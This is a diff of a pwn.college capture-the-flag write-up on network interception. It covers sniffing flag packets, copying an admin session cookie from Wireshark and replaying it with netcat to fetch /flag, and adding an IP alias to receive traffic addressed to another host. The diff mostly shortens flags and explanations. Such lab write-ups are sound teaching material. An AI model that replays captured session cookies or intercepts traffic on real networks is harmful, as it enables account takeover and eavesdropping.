@@ -257,15 +257,13 @@ As the packets stream in, fragments and recurring strings of the flag appear in 
 
 ```text
 listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
-BP1.S...pwn.college{E3G_zaUdErR3u9nakhsV_ozurzo.QXZyMzMwSM0cjM3EzW}
-......%pwn.college{E3G_zaUdErR3u9nakhsV_ozurzo.QXZyMzMwSM0cjM3EzW}
-|A.....{pwn.college{E3G_zaUdErR3u9nakhsV_ozurzo.QXZyMzMwSM0cjM3EzW}
-[P?fk!..pwn.college{E3G_zaUdErR3u9nakhsV_ozurzo.QXZyMzMwSM0cjM3EzW}
+BP1.S...pwn.college{E3G_…3EzW}
+......%pwn.college{E3G_…3EzW}
+|A.....{pwn.college{E3G_…3EzW}
+[P?fk!..pwn.college{E3G_…3EzW}
 ```
 
-<Callout type="tip" title="Piecemeal Flag Extraction">
-If the terminal payload output is cluttered with TCP header noise or segmented across multiple packets, saving the stream with `tee` makes it easy to grep for `pwn.college{` or reconstruct the full token cleanly.
-</Callout>
+I had ChatGPT piece together the flag for me after getting the output.
 
 ---
 
@@ -283,7 +281,9 @@ hacker@intercepting-communication~sniffing-cookies:/challenge$ ./run
 root@ip-10-0-0-1:/challenge# wireshark
 ```
 
-Start capturing on `eth0`. Apply an `http` filter in Wireshark and inspect an outgoing `GET /ping` request. Copy the **Hypertext Transfer Protocol** payload as ASCII text:
+Click **start capturing packets** on Wireshark.
+
+Filter for HTTP, view the `GET /ping` request, and copy the **Hypertext Transfer Protocol** as ASCII Text:
 
 ```http
 GET /ping HTTP/1.1
@@ -295,11 +295,9 @@ Connection: keep-alive
 Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ.avwM2A.7grH7Hsoj9LtVrdjFjKKhBE_8q0
 ```
 
-Notice the cookie header contains an active session token: `session=eyJ1c2VyIjoiYWRtaW4ifQ...` (base64-decoding reveals `{"user":"admin"}`).
-
 ### 2. Replay with Netcat against `/flag`
 
-Open netcat to `10.0.0.2:80`, change the endpoint from `/ping` to `/flag`, and pass the captured session cookie:
+Change the endpoint to `/flag` and setup netcat:
 
 ```bash
 root@ip-10-0-0-1:/challenge# nc 10.0.0.2 80
@@ -312,7 +310,7 @@ Connection: keep-alive
 Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ.avwM2A.7grH7Hsoj9LtVrdjFjKKhBE_8q0
 ```
 
-Press Enter twice to complete the HTTP request headers. The server validates the admin session and returns the flag:
+The response returns the flag:
 
 ```http
 HTTP/1.1 200 OK
@@ -323,16 +321,14 @@ Content-Length: 61
 Vary: Cookie
 Connection: close
 
-pwn.college{IAR0DfuDlspFhBroOLDdwgGkDum.0VM0AjNxwSM0cjM3EzW}
+pwn.college{IAR0…3EzW}
 ```
 
 ---
 
 ## Network Configuration
 
-In this challenge, the target service is transmitting flags to an IP address that isn't currently assigned to your machine (`10.0.0.3`). You must configure your network interface to receive packets addressed to that destination.
-
-### 1. Inspect Current Interface Configuration
+In this challenge, we inspect the network interface, assign an additional IP address to receive traffic intended for that destination, and catch incoming flags.
 
 ```bash
 root@ip-10-0-0-1:/challenge# ip addr show eth0
@@ -343,51 +339,35 @@ root@ip-10-0-0-1:/challenge# ip addr show eth0
 
 root@ip-10-0-0-1:/challenge# ip route
 10.0.0.0/24 dev eth0 proto kernel scope link src 10.0.0.1
-```
 
-### 2. Add the Target IP Alias
-
-Assign `10.0.0.3/24` to `eth0` so the Linux kernel accepts packets sent to `10.0.0.3`:
-
-```bash
 root@ip-10-0-0-1:/challenge# ip addr add 10.0.0.3/24 dev eth0
-```
-
-Verify the new secondary IP address:
-
-```bash
 root@ip-10-0-0-1:/challenge# ip addr show eth0
 3: eth0@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
+    link/ether be:b4:99:e0:cc:e7 brd ff:ff:ff:ff:ff:ff link-netnsid 0
     inet 10.0.0.1/24 scope global eth0
        valid_lft forever preferred_lft forever
     inet 10.0.0.3/24 scope global secondary eth0
        valid_lft forever preferred_lft forever
-```
 
-<Callout type="info" title="Command Breakdown: ip addr add">
-- `ip addr`: Subcommand for managing IP addresses.
-- `add`: Assigns a new address to a device.
-- `10.0.0.3/24`: The destination IP address and subnet prefix.
-- `dev eth0`: Binds the address to the `eth0` network interface.
-</Callout>
-
-### 3. Catch the Incoming Connection
-
-Now start a netcat listener on port `31337`:
-
-```bash
 root@ip-10-0-0-1:/challenge# nc -lvnp 31337
 Listening on 0.0.0.0 31337
 Connection received on 10.0.0.2 48384
-pwn.college{coJv98q69Fg3FBySMKAGHAmig7u.QX1YzMzwSM0cjM3EzW}
+pwn.college{coJv…3EzW}
 ```
 
-<Callout type="tip" title="Netcat Flag Breakdown">
-- `-l`: Listen for incoming connections instead of initiating an outbound one.
-- `-v`: Verbose output (displays connection notices and remote IP/port).
-- `-n`: Numeric-only; prevents DNS lookup delays.
-- `-p 31337`: Specifies the local port to bind and listen on.
-</Callout>
+### Breaking it down:
+
+- `ip addr`: Manage IP addresses.
+- `add`: Add an address.
+- `10.0.0.3/24`: The IP address and subnet prefix.
+- `dev eth0`: Apply it to the `eth0` interface.
+
+### The flags mean:
+
+- `-l`: Listen for incoming connections.
+- `-v`: Verbose output.
+- `-n`: Don't perform DNS lookups.
+- `-p`: Specify the listening port.
 
 ---
 
